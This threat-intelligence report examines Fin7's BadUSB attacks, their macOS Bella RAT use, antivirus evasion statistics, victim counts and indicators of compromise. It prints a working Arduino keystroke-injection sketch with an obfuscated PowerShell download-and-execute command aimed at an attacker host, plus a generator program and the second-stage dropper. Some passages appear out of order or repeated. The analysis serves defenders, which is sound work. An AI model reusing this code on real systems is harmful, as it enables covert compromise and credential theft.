Before disclosing the\nrelationship between Fin7 and REvil groups, we are trying to reach the ransomware victims.\nUntil reaching all necessary parties, we will continue to publish articles about Fin7 attackers’\ntools.\n\nIn the [first article, we examined version changes of Carbank backdoor’s control panel and](https://threatintel.blog/OPBlueRaven-Part1/)\nexposed previously unknown Tirion Loader. We expect that Fin7 group will replace the\nCarbanak backdoor with this loader in their future campaigns.\n\n\n-----\n\nIn this section of our series, we will be diving into the BadUSB attacks carried out by Fin7\nthreat actors.\n\nWe will be approaching this topic as follows:\n\nOverview of BadUSB attack\nmacOS targeted BadUSB attacks\nAV detection statistics collected by attackers\nVictim statistics\n\n## BadUSB attacks\n\nIn March 2020, BadUSB attacks associated with the Fin7 attack group were publicly\nreported[1]. The purpose of these social engineering attacks was to convince potential\nvictims to plug-in USB flash drives (which are running malicious codes) into their computers.\n\nAs it is known in BadUSB attacks, an attacker modifies a USB flash drive to act as a human\ninterface device (HID), (e.g., a keyboard) and give inputs to the victim machine through this\nHID.\n\nIn the relevant Fin7 attacks, we have detected that Fin7 actors are modifying their USBs to\nact as a keyboard and simulate keyboard strokes for the purpose of invoking a malicious\nPowershell command.\n\nThe video below, which was recorded by attackers (and it is one of the exposed Fin7 group\nfiles), shows a demo of the BadUSB attack. In the video, the attacker plugs-in harmful USB\ndrive to the test computer. Then a malicious command was typed in a short time by BadUSB,\n\n\n-----\n\nand a fake error message was shown.\n\nAttackers use Atmega32u modules to create BadUSB drives. The code snippet below shows\nthe decompiled C# code of the Arduino source code generator program used by the Fin7\ngroup. This program takes a string as input and generates Arduino source code to type this\nstring in the victim machine by simulating a keyboard.\n\n\n-----\n\nConsole.WriteLine(\"#include <Keyboard.h>\\r\\n\\r\\nvoid typeKey(uint8_t\nkey)\\r\\n{\\r\\nKeyboard.press(key);\\r\\ndelay(50);\\r\\nKeyboard.release(key);\\r\\n}\\r\\n\\r\\n/* Init function */\\r\\nvoid\nsetup()\\r\\n{\\r\\n// Begining the Keyboard stream\\r\\nKeyboard.begin();\\r\\n\\r\\n// Wait\n500ms\\r\\ndelay(1000);\\r\\n\\r\\nKeyboard.press(KEY_LEFT_GUI);\\r\\nKeyboard.press('r');\\r\\nKeyboard.releaseAll();\\r\\ndelay\n(500);\");\nfor (int j = 0; j < list.Count; j++)\n{\nstring[] array = list[j].Split(new char[]\n{\n' '\n});\nfor (int k = 0; k < array.Length; k++)\n{\nbool flag2 = list[j].Equals(\"typeKey(' ');\");\nif (flag2)\n{\nConsole.WriteLine(list[j]);\nConsole.WriteLine();\nbreak;\n}\nforeach (KeyValuePair<string, string> keyValuePair2 in dictionary)\n{\nbool flag3 = array[k].Equals(keyValuePair2.Key);\nif (flag3)\n{\nConsole.WriteLine(keyValuePair2.Value);\nConsole.WriteLine();\n}\n}\n}\nConsole.WriteLine(\"Keyboard.releaseAll();\");\nConsole.WriteLine();\n}\nConsole.WriteLine(\"// Ending stream\\r\\nKeyboard.end();\\r\\n}\\r\\n\\r\\n/* Unused endless loop */\\r\\nvoid loop() {}\");\n\nConsole.ReadKey();\n\nThe code snippet below shows an example of a harmful Arduino code that is used to create\nBadUSB devices for the attacks during March 2020.\n\n\n-----\n\n#include <Keyboard.h>\n\nvoid typeKey(uint8_t key)\n{\nKeyboard.press(key);\ndelay(50);\nKeyboard.release(key);\n}\n\n/* Init function */\nvoid setup()\n{\n// Begining the Keyboard stream\nKeyboard.begin();\n\n// Wait 500ms\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\nKeyboard.releaseAll();\ndelay(500);\n//\nKeyboard.println(\"cmd /c start /min powershell -c \\\"\n\n[char[]]'2//6}&|usz!|jfy!))Ofx.Pckfdu!Ofu/XfcDmjfou*/EpxompbeTusjoh)(iuuqt;00njmlnpwfnpofz/dpn0tu0nj/joj(**\n<fyju~!dbudi!|~~'|%{$s+=[char]([int]$_-1)};iex $s\");\n//\ndelay(500);\nKeyboard.press(KEY_RETURN);\nKeyboard.releaseAll();\n// Ending stream\nKeyboard.end();\n}\n\n/* Unused endless loop */\nvoid loop() {}\n\nThe payload above download and execute second stage Powershell payload. These\npayloads have already been analyzed by security researchers. So in this article, we won’t\ngive reverse engineering details for the payload.\n\n\nIn the image below you can see an example for second stage Powershell payload. The\nsecond stage is responsible for deploying JavaScript backdoor and showing a fake error\nmessage. You can view the command and control servers list in the Appendix.\n\n\n-----\n\n$ErrorActionPreference = \"SilentlyContinue\"\n$p = @(\"$Env:windir\\system32\\wscript.exe\", \"cninit.exe\", \"amin.ini\", \" /e:jscript \")\ncd \"$Env:APPDATA\\Microsoft\\Windows\"\ncp $p[0] $p[1]\nsaps \"cmd.exe\" ((\" /c \", $p[1], $p[3], $p[2])-join \"\") -win hidden\n\nAdd-Type -AssemblyName System.Windows.Forms\n$r=[System.Windows.Forms.Messagebox]::Show(\n\"The last USB device you connected to this computer malfunctioned,\" +\n\"and Windows does not recognize it.\", \"USB Device Not Recognized\", 0, 48);\n\nexit\n\nThe code snippet below shows a part of the deobfuscated Javascript backdoor. As a\nsummary, this Javascript backdoor gathers system information and executes JavaScript\npayloads that taken from the command and control server.\n\n\nIn the previous section, we discussed BadUSB attacks against victims that are using\nWindows OS. Now we will share unpublished details about macOS targeted BadUSB attacks\nof the Fin7 group.\n\n\nThe code snippet below shows a part of the deobfuscated Javascript backdoor.

Features of this RAT is listed below:\n\nRemote shell\nPersistence\nFile transfer\nReverse VNC\nAudio stream\nLogin / keychain password phishing through system prompt\nApple ID password phishing through iTunes prompt\niCloud Token Extraction\nAccessing all iCloud services of the user through extracted tokens or passwords(iCloud\nContacts, Find my iPhone, Find my Friends, iOS Backups)\nGoogle Chrome Password Extraction\nChrome and Safari History Extraction\nAuto Keychain decryption upon discovery of kc password\nmacOS Chat History\niTunes iOS Backup enumeration\n\n\ndelay(500);\n\nKeyboard.print(\"rm -rf __MACOSX\");\n\ntypeKey(KEY_RETURN);\n\ndelay(500);\n\nKeyboard.print(\"history -c\");\n\ntypeKey(KEY_RETURN);\n\ndelay(500);\n\nKeyboard.print(\"exit\");\n\ntypeKey(KEY_RETURN);\n\n// End Payload\n\n// Stop Keyboard and Mouse\nKeyboard.end();\nAbsoluteMouse.end();\n}\n\n// Unused\nvoid loop() {}\n\nFurther analyses on the dropped second stage payload reveals that the Fin7 group uses an\nopen-source remote administration tool, whose name is Bella, to control macOS victim\nmachines. Features of this RAT is listed below:\n\n\n-----\n\nWe applied source code diffing between a publicly available version at\n[Github(https://github.com/kdaoudieh/Bella) and the Fin7 version of the RAT. In the image](https://github.com/kdaoudieh/Bella)\nbelow, the left part shows the publicly available code and the right part shows the modified\nversion. We identified two significant changes. The payload is switched to the “nondevelopment” mode and “print” statements are removed.\n\nBella RAT command and control server is defined as “172.86.75.175:8443“ in the source\ncode.\n\n## Antivirus Detection Statistics\n\nWhile investigating the exposed files for uncovering more details about the BadUSB attacks,\nwe recognized that attackers generated detailed anti-virus detection statistics about their\ntoolkit. Because of their non-trivial attack vector, they can’t use publicly available anti-virus\nchecker services to evaluate their evasion success. Instead of that, they use isolated virtual\nmachines that are running a particular AV product.\n\nNote: Our team didn’t manually validate anti-virus detection results that are shown in the\nfollowing section.\n\nThe image below shows the detection rate results for a BadUSB attack’s Powershell\npayload. As you can see from the image only 5 of them can detect and block the attack:\n\n\n-----\n\nRed color represent: Detected by AV product\nGreen color represent: Undetected by AV product\n\nAfter further research, we detected that attackers generated detailed anti-virus detection\nstatistics for other malicious tools, too. Below image shows detection statistics for Fin7 tools\nsuch as Malicious Macros, Metasploit stagers, Winbio, and a Powershell Keylogger. As you\ncan see in the image, 2/3 of these attacks can not be detected by AV solutions.\n\nRed color represent: Detected\n\nYellow color represent: No detection but no session\n\nGreen color represent: Undetected\n\n\n-----\n\nBlue color represent: Detected but session comes\nPurple color represent: Not detected if compiled as Powershell cmdline\nWhite color represent: Not tested\n\n## Victim Statistics\n\nOur team managed to eavesdrop communication between attackers. Investigation on these\nlogs reveals that attackers use an XMPP bot to get notified when a new bot added to one of\ntheir malicious campaigns. Each notification contains the below information:\n\nTimestamps\nBot ID (unique number + machine hostname)\nProxy server address\nGroup(campaign) name\nFile ID (we believe that this number represent second-stage payload files)\n\nWe observed notifications between February 2020 and April 2020. The chart below shows\nthe cumulative new bot count by day.\n\nSo far, we identified 325 victims in 16 countries. The data shows that the Fin7 group mostly\ntargets the USA.\n\n\n-----\n\nUnited States\nUnited Kingdom\nGermany\nRussia\nSpain\nSweden\nSwitzerland\nIsrael\nItaly\nMexico\nNetherlands\nPanama\nPoland\nChile\nCzech Republic\nSlovakia\n\nWe observed 12 different campaign names. The chart below shows the victim count\npercentage for campaigns.\n\n\n-----\n\nFLASH\nTEST\nf1\nf2\nf4\ninnersXLS\njsoc\nksoc\npersistence\nrub\nzed\nzsoc\n\n## Outro & End of Part II\n\nIn today’s article, we revealed details about the BadUSB campaign of the Fin7 group. We\ndisclosed that attackers use an open-source RAT to manage macOS victim machines. We\nshared details of victim statistics and antivirus detection statistics which is collected by\nattackers.\n\n\n-----\n\nIn the next articles, we are planning to share details of attacker attribution by diving more\ndeeply into actual correspondances between attackers, as well as information acquired from\nattackers’ machines.\n\nPlease note that our team still tries to get in touch with all detected victims of relevant\nattacks; as we are planning to reveal roles of each threat actor in different (already realized)\nattack scenarios.\n\n## Appendix: Indicators of Compromise (IOC)\n\n**C&C servers (hostnames and IPs)**\n\nhawrickday.com\n\nlandscapesboxdesign9.com\n\nmilkmovemoney.com\n\nmoviedvdpower.com\n\nmozillaupdate.com\n\ntableofcolorize.com\n\nvmware-cdn.com\n\nsoftowii.com\n\ncolorpickerdesk.com\n\nexpressdesign9.com\n\nuntypicaldesign9.com\n\ndigitalsoundmaker99.com\n\nuntypicaldesign9.com\n\ndigitalsoundmaker99.com\n\nhong-security.com\n\nfgfotr.com\n\nnattplot.com\n\nuoplotr.com\n\n193.187.175.213\n\n\n-----\n\n**C&C servers (hostnames and IPs)**\n\n172.86.75.175\n\n## References\n\n1. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/would-you\nexchange-your-security-for-a-gift-card/\n\n\n-----",
